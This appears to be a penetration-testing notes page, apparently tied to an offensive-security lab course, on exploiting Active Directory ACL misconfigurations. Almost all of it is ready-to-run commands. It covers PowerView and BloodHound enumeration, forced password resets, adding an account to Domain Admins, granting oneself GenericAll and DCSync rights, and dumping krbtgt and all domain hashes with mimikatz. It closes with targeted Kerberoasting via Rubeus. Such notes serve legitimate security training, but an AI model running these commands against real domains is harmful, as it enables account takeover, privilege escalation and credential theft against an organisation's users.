---
layout: page
title: "AD Object Permissions"
---

# AD Object Permissions

Active Directory objects carry ACLs. Misconfigurations grant non-admin accounts rights like `GenericAll`, `GenericWrite`, or `WriteDACL` over users, groups, or computers. These rights translate directly to account takeover or group membership manipulation.

## Enumerate ACLs with PowerView

```powershell
powershell -ep bypass
. .\powerview.ps1

# Find objects where current user has interesting rights (users)
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {
    $_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_
} | Where-Object { $_.Identity -eq "$env:UserDomain\$env:Username" }

# Same for groups
Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {
    $_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_
} | Where-Object { $_.Identity -eq "$env:UserDomain\$env:Username" }

# Same for computers (relevant for RBCD)
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {
    $_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_
} | Where-Object { $_.Identity -eq "$env:UserDomain\$env:Username" }
```

## BloodHound

```powershell
# Collect
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\tools\

# Kali
sudo neo4j start
bloodhound
# Upload zip -> Shortest Paths to Domain Admins -> inspect edges
```

```shell
# BloodHound CE (Python collector from Kali)
bloodhound-python -u offsec -p lab -d corp1.com -ns 192.168.1.5 -c All
```

## GenericAll on User → Password Reset

```powershell
# Reset target's password without knowing the old one
net user targetuser NewPass123! /domain

# Or with PowerView
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
```

## GenericAll on Group → Add Member

```powershell
# Add current user to target group
net group "Domain Admins" offsec /add /domain

# Or with PowerView
Add-DomainGroupMember -Identity "Domain Admins" -Members offsec
```

## WriteDACL → Add GenericAll → Takeover

```powershell
# Grant yourself GenericAll on the target object
Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity offsec -Rights All

# Now reset their password
net user targetuser NewPass123! /domain
```

## WriteDACL on Domain Object → DCSync

```powershell
# Grant DCSync rights to current user
Add-DomainObjectAcl -TargetIdentity "DC=corp1,DC=com" -PrincipalIdentity offsec -Rights DCSync

# Verify
Get-ObjectAcl -DistinguishedName "DC=corp1,DC=com" -ResolveGUIDs | Where-Object {$_.IdentityReference -like "*offsec*"}

# DCSync
mimikatz.exe
privilege::debug
lsadump::dcsync /domain:corp1.com /user:krbtgt
lsadump::dcsync /domain:corp1.com /all /csv
```

## GenericWrite on User → Targeted Kerberoasting

```powershell
# Set an SPN on the target user account
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/spn'}

# Kerberoast the account
.\Rubeus.exe kerberoast /user:targetuser /nowrap

# Remove SPN after cracking
Set-DomainObject -Identity targetuser -Clear serviceprincipalname
```
